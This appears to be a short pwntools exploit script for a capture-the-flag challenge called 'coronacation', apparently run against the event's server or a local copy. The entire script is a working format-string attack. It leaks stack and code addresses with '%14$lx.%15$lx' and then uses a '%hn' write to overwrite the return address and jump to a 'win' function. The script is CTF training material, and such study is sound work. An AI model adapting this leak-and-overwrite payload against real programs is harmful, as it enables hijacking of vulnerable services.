from pwn import *
context.arch="amd64"

elf = ELF("./coronacation",False)

if 'rem' in sys.argv:
    r = remote("ctf.umbccd.io", 4300)
else:
    r = process("./coronacation", env={})
    if '-d' in sys.argv:
        script = '''
        boff 0x13f8
        boff 0x132f
        c
        '''
        gdb.attach(r, script)

# Get leaks of the stack and the return address into main
r.send("1.%14$lx.%15$lx.\n")
r.recvuntil("chose: 1.")
stack = int(r.recvuntil(".")[:-1], 16)-8 # subtract so it becomes the return address into main+...

print "STACK: "+hex(stack)

#calculate the address of the flag function
elf.address = int(r.recvuntil(".")[:-1], 16)-elf.symbols['main']-0xe
print "TEXT: "+hex(elf.address)

print elf.symbols['win']&0xffff

#overwrite the last two bytes of return with the last two bytes of win
pl = "%"+str(elf.symbols['win']&0xffff)+"x%11$hn"
pl = pl.ljust(0x28,"\0")
pl += flat(stack)
r.send(pl+'\n')

r.interactive()
